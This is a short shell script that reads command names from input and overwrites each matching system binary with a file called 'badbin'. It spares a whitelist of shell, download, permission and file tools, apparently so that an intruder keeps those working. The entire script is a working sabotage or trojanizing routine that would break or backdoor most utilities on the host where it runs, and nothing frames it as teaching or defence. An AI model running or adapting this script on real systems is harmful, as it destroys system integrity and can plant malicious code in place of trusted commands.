#!/bin/sh
while read line
do
    toReplace=`which $line`
    if [ $line == "busybox" ]||[ $line == "sh" ]||[ $line == "dash" ]|| [ $line == "ls" ]|| [ $line == "echo" ]||[ $line == "wget" ] || [ $line == "chmod" ] || [ $line == "bash" ] || [ $line == "cp" ] || [ $line == "compgen" ] || [ $line == "rm" ] || [ $line == "mv" ] || [ $line == "which" ];  then
        :
    else
    cp badbin $line
    mv $line $toReplace
    fi
done < "/dev/stdin"